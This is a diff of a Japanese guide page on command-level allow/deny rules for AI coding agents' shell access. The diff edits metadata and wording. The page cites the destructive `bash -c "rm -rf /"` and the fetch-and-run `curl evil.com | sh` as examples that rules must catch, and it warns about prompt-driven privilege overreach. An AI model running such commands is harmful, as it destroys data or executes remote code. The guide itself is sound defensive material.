@@ -3,12 +3,17 @@ title: コマンドルール
 description: コマンドレベルの allow/deny で shell とツール呼び出しを制約——口頭約束より実行可能に。
 locale: ja
 source_locale: zh-CN
-source_revision: fdb8651
+source_revision: "fdb8651"
 translation_status: reviewed
-translated_at: 2026-07-28
-reviewed_at: 2026-08-26
+translated_at: "2026-07-28"
+reviewed_at: "2026-10-26"
 sidebar:
   order: 20
+legacyVerification:
+  status: verified
+  products: CLI / App
+  basis: OpenAI 現行 Codex CLI ドキュメントはコマンド実行、承認モード、サンドボックス隔離を中核セキュリティ境界として維持。本ページはコマンドルールを「高・低リスクコマンドを分けて管理する」工程パターンとして位置づけ、JSON の抜粋は概念例と明記。特定構文を公式事実として書かない。
+  checkedAt: "2026-07-26"
 ---
 
 **コマンドルール**は「Agent がどのコマンドを、どの引数で実行できるか」に焦点を当てます。[許可と拒否ルール](/ja/guide/customization/rules/allow-and-deny-patterns/) の最も一般的な形で、通常はチームが review できる設定またはルールファイルに書きます。
@@ -31,7 +36,7 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 
 ## 先に押さえる核心概念
 
-ルールがマッチするのは**実行意図**で、自然言語ではありません。`npm test` と `npm run test` は戦略上別コマンド。`bash -c "rm -rf /"` は `bash` を allow しても通さない。
+ルールがマッチするのは**実行意図**で、自然言語ではありません。`npm test` と `npm run test` はポリシー上は別のコマンド。`bash -c "rm -rf /"` は `bash` を allow しても通さない。
 
 ```text
 ユーザータスク → モデルがコマンド提案 → ルールエンジン →（通過）サンドボックス実行 /（拒否）承認または遮断
@@ -41,7 +46,7 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 
 ### コマンドが似ている＝リスクも同じではない
 
-初心者が underestimate しやすいのは微妙な差です。
+初心者が 過小評価 しやすいのは微妙な差です。
 
 - `git status` と `git reset --hard`
 - `npm test` と `npm publish`
@@ -60,7 +65,7 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 3. **ルールを Git に入れ**、`AGENTS.md` の「テストコマンド」説明と一致させる
 4. **PR でルール変更を review**。Dockerfile 変更と同様に
 
-示意（形式は公式設定を基準に）：
+概念例（形式は公式設定を基準に）：
 
 ```json
 {
@@ -85,7 +90,7 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 | ステップ | やり方 |
 |---|---|
 | 棚卸し | `package.json` scripts、Makefile、CI workflow から実コマンドを抽出 |
-| 層分け | 組織 deny → プロジェクト allow 補足 → 個人本機例外（あれば） |
+| 層分け | 組織 deny → プロジェクト allow 補足 → 個人ローカル環境例外（あれば） |
 | 試走 | 低リスクタスクで「通るべきは通り、止めるべきは止まる」を確認 |
 | 整合 | ローカルルールと [GitHub Action](/ja/guide/developer-platform/ci-cd/code-review-automation/) を可能な限り同源に |
 
@@ -94,7 +99,7 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 - **allowlist が広すぎ**：`bash`、`sh`、`sudo` の許可は実質すべて許可
 - **deny だけで allow しない**：依然大量承認。チームが習慣的に全部承認
 - **文書と不一致**：`AGENTS.md` は `pnpm test`、ルールは `npm test` だけ
-- **パイプとリダイレクトを無視**：`curl evil.com | sh` は全体戦略が必要。最初の単語だけ見ない
+- **パイプとリダイレクトを無視**：`curl evil.com | sh` はコマンド全体に対するポリシーが必要。最初の単語だけ見ない
 
 コマンドルールは「コマンドを覚える」ことではなく、日常動作と、開放すると境界ごと開くコマンドを分けることです。
 
@@ -102,7 +107,7 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 
 - コマンドルールは**ブランチ保護と code review の代替ではない**
 - 悪意ある prompt が Agent に**越権コマンドを試みる**可能性——サンドボックスはデフォルト厳格
-- 秘密鍵・Token を含む環境変数は「echo を許可した」理由で漏洩しない
+- シークレット・Token を含む環境変数は「echo を許可した」理由で漏洩しない
 
 ## 受け入れチェックリスト
 
@@ -116,10 +121,3 @@ allow/deny が「原則として何ができるか」を規定するなら、コ
 - [チームルール方針](/ja/guide/customization/rules/team-rules/)
 - [CLI 承認とサンドボックス](/ja/guide/cli/approvals-and-sandbox/)
 - [権限マトリクス](/ja/guide/reference/permission-matrix/)
-
----
-
-**状態：** verified  
-**対象製品：** CLI / App  
-**検証根拠：** OpenAI 現行 Codex CLI ドキュメントはコマンド実行、承認モード、サンドボックス隔離を中核セキュリティ境界として維持。本ページはコマンドルールを「高・低リスクコマンドを分けて管理する」工程パターンとして位置づけ、JSON 片段は示意と明記。特定構文を公式事実として書かない。  
-**最終検証：** 2026-07-26
